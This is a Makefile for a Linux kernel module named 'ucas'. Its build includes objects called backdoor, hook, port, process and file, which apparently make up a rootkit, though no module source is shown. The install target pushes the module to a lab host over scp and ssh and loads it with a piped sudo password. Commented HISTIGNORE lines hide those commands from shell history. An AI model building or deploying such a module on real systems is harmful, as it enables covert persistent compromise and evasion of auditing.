PWD := $(shell pwd)
PASSWORD = ${sudo_password}

#SRCS := $(wildcard src/*.c)
#SRCS_OBJS := $(patsubst %.c, %.o, $(SRCS))

MODULE_NAME = ucas
obj-m := $(MODULE_NAME).o
$(MODULE_NAME)-y := src/main.o
$(MODULE_NAME)-y += src/data.o
$(MODULE_NAME)-y += src/backdoor.o
$(MODULE_NAME)-y += src/file.o
$(MODULE_NAME)-y += src/hook.o
$(MODULE_NAME)-y += src/module.o
$(MODULE_NAME)-y += src/port.o
$(MODULE_NAME)-y += src/process.o
ccflags-y := -I$(src)/include -g -O0

.PHONY: module clean install uninstall

all: module

module:
	$(MAKE) -C /lib/modules/5.10.140/build M=$(PWD) modules

clean:
	$(MAKE) -C /lib/modules/5.10.140/build M=$(PWD) clean

install:
	scp $(MODULE_NAME).ko black@192.168.145.133:/home/black/
	#export HISTIGNORE='*sudo -S*'
	ssh black@192.168.145.133 'echo $(PASSWORD) | sudo -S insmod /home/black/$(MODULE_NAME).ko'

uninstall:
	#export HISTIGNORE='*sudo -S*'
	ssh black@192.168.145.133 'echo $(PASSWORD) | sudo -S rmmod $(MODULE_NAME)'

#print:
#	@echo $(SRCS)
#	@echo $(SRCS_OBJS)
